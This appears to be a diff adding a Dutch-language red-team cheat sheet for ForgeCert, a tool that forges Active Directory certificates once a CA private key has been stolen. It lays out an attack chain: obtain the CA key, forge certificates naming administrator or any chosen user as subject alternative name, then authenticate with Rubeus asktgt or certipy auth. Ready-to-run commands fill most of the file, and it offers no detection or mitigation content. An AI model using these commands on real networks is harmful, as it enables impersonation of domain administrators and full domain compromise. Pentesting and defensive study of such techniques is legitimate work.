@@ -1,0 +1,31 @@
+# ForgeCert — Certificaten smeden met gestolen CA private key
+# Maak willekeurige certificaten aan na diefstal van de CA private key (ADCS ESC7/theft)
+#
+# === Syntax ===
+# ForgeCert.exe --CaCertPath <pad> --CaCertPassword <ww> --Subject <CN> --SubjectAltName <UPN> --NewCertPath <pad> --NewCertPassword <ww>
+#
+# === Belangrijkste opties ===
+# --CaCertPath PATH        Pad naar gestolen CA certificaat (.pfx)
+# --CaCertPassword PASS    Wachtwoord van het CA certificaat
+# --Subject CN             Subject van het nieuwe certificaat (bijv. "CN=User")
+# --SubjectAltName UPN     UPN van het te impersoneren account
+# --NewCertPath PATH       Pad voor het gesmede certificaat
+# --NewCertPassword PASS   Wachtwoord voor het nieuwe certificaat
+# --CRL URL                Optioneel: aangepaste CRL distributiepoint
+#
+# === Aanvalsketen ===
+# 1. Verkrijg CA private key (bijv. via DVKS backup, DC NTDS, of CA server toegang)
+# 2. Smeed certificaat met ForgeCert
+# 3. Authenticeer met gesmeed certificaat via Rubeus
+#
+# === Voorbeelden ===
+# -- Smeed certificaat als Domain Admin --
+ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "PASS" --Subject "CN=User" --SubjectAltName administrator@DOMAIN --NewCertPath forged.pfx --NewCertPassword "PASS"
+# -- Smeed certificaat als willekeurige gebruiker --
+ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "PASS" --Subject "CN=Target" --SubjectAltName USER@DOMAIN --NewCertPath forged.pfx --NewCertPassword "PASS"
+# -- Authenticeer met gesmeed certificaat --
+# Rubeus.exe asktgt /user:administrator /domain:DOMAIN /certificate:forged.pfx /password:PASS /nowrap
+# -- Converteer pfx naar pem (Linux) --
+# openssl pkcs12 -in forged.pfx -out forged.pem -nodes
+# -- Gebruik met certipy (Linux) --
+# certipy auth -pfx forged.pfx -dc-ip DC_IP
